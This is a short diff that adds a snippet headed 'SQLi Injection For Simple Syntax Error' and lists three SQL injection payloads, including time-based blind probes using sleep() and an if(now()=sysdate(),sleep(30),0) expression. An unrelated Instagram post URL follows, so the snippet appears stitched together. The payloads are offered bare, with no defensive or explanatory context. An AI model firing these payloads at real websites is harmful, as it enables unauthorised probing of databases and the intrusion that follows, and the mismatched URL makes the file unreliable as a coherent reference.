@@ -1,0 +1,6 @@
+##SQLi Injection For Simple Syntax Error:
+'
+'sleep(1000)
+'xor(if(now()=sysdate(),sleep(30),0))or'
+
+url = https://www.instagram.com/p/Dc8xW2xiTpw/?img_index=1
